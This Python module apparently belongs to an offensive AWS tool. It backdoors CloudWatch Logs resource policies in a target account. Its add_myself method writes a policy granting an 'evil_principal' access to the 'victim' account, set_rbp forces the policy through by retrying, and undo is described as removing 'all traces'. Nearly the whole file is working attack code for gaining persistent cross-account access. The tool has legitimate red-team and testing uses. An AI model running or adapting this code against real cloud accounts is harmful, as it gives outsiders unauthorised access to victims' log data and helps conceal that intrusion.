import logging
import json
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseGetRbp

logger = logging.getLogger(__name__)


class CloudwatchResourcePolicy(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        service = "logs"
        resource_type = "*"
        # The Principal block in policies requires the use of account Ids (999988887777) instead of ARNs (
        # "arn:aws:iam::999988887777:user/evil")
        self.override_account_id_instead_of_principal = True
        self.override_resource_block = self.arn
        super().__init__(name, resource_type, service, region, client, current_account_id,
                         override_account_id_instead_of_principal=True,
                         override_resource_block=self.arn)

    @property
    def arn(self) -> str:
        return "*"

    @property
    def policy_exists(self):
        """Return true if the policy exists already. CloudWatch resource policies are weird so we take
        a different approach"""
        response = self.client.describe_resource_policies()
        result = False
        if response.get("resourcePolicies"):
            for item in response.get("resourcePolicies"):
                if item.get("policyName") == constants.SID_SIGNATURE:
                    result = True
        return result

    def _get_rbp(self) -> ResponseGetRbp:
        """Get the resource based policy for this resource and store it"""
        # When there is no policy, let's return an empty policy to avoid breaking things
        empty_policy = constants.get_empty_policy()
        policy_document = PolicyDocument(
            policy=empty_policy, service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        try:
            resources = {}
            paginator = self.client.get_paginator("describe_resource_policies")
            page_iterator = paginator.paginate()
            for page in page_iterator:
                these_resources = page["resourcePolicies"]
                for resource in these_resources:
                    name = resource.get("policyName")
                    tmp_policy_document = json.loads(resource.get("policyDocument"))
                    resources[name] = dict(policyName=name, policyDocument=tmp_policy_document)
            if resources:
                if resources.get(constants.SID_SIGNATURE):
                    policy = resources[constants.SID_SIGNATURE]["policyDocument"]
                    policy_document = PolicyDocument(
                        policy=policy,
                        service=self.service,
                        override_action=self.override_action,
                        include_resource_block=self.include_resource_block,
                        override_resource_block=self.override_resource_block,
                        override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
                    )
            success = True
            response = ResponseGetRbp(policy_document=policy_document, success=success)
            return response
        except botocore.exceptions.ClientError as error:
            logger.debug(error)
            success = False
            response = ResponseGetRbp(policy_document=policy_document, success=success)
            return response

    def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Add your rogue principal to the AWS resource"""
        logger.debug(f"Adding {evil_principal} to {self.arn}")
        evil_policy = self.policy_document.policy_plus_evil_principal(
            victim_account_id=self.current_account_id,
            evil_principal=evil_principal,
            resource_arn=self.arn
        )
        if dry_run:
            operation = "DRY_RUN_ADD_MYSELF"
            message = (f"The CloudWatch resource policy named {constants.SID_SIGNATURE} exists. We need to remove it"
                       f" first, then we will add on the new policy.")
            tmp = self._get_rbp()
            success = tmp.success
        else:
            operation = "ADD_MYSELF"
            self.undo(evil_principal=evil_principal)
            try:
                self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=json.dumps(evil_policy))
                message = f"Added CloudWatch Resource Policy named {constants.SID_SIGNATURE}."
                success = True
            except botocore.exceptions.ClientError as error:
                success = False
                message = error
                logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                                f"{self.name}. %s" % error)

        response_message = ResponseMessage(message=message, operation=operation, success=success, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=evil_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        new_policy = json.dumps(evil_policy)
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.put_resource_policy
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.put_destination_policy
        success = True
        try:
            self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=new_policy)
            message = "success"
            success = True
        except self.client.exceptions.InvalidParameterException as error:
            logger.debug(error)
            logger.debug("Let's just try it again - AWS accepts it every other time.")
            self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=new_policy)
            message = str(error)
            success = True
        except botocore.exceptions.ClientError as error:
            message = str(error)
            success = False
        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=evil_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Remove all traces"""
        operation = "UNDO"
        # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.delete_resource_policy
        if not self.policy_exists:
            message = f"The policy {constants.SID_SIGNATURE} does not exist."
            success = True
        else:
            try:
                self.client.delete_resource_policy(policyName=constants.SID_SIGNATURE)
                message = f"Deleted the CloudWatch resource policy named {constants.SID_SIGNATURE}"
                success = True
            except botocore.exceptions.ClientError as error:
                success = False
                message = error
                logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                                f"{self.name}. %s" % error)
        new_policy = constants.get_empty_policy()
        response_message = ResponseMessage(message=message, operation=operation, success=success,
                                           evil_principal=evil_principal, victim_resource_arn=self.arn,
                                           original_policy=self.original_policy, updated_policy=new_policy,
                                           resource_type=self.resource_type, resource_name=self.name,
                                           service=self.service)
        return response_message


class CloudwatchResourcePolicies(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "cloudwatch"
        self.resource_type = "resource-policy"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator("describe_resource_policies")
        page_iterator = paginator.paginate()
        for page in page_iterator:
            these_resources = page["resourcePolicies"]
            for resource in these_resources:
                name = resource.get("policyName")
                # This is not a real ARN.
                # We made it up because AWS doesn't have ARNs for CloudWatch resource policies ¯\_(ツ)_/¯
                arn = f"arn:aws:logs:{self.region}:{self.current_account_id}:resource-policy:{name}"
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                resources.append(list_resources_response)
        return resources
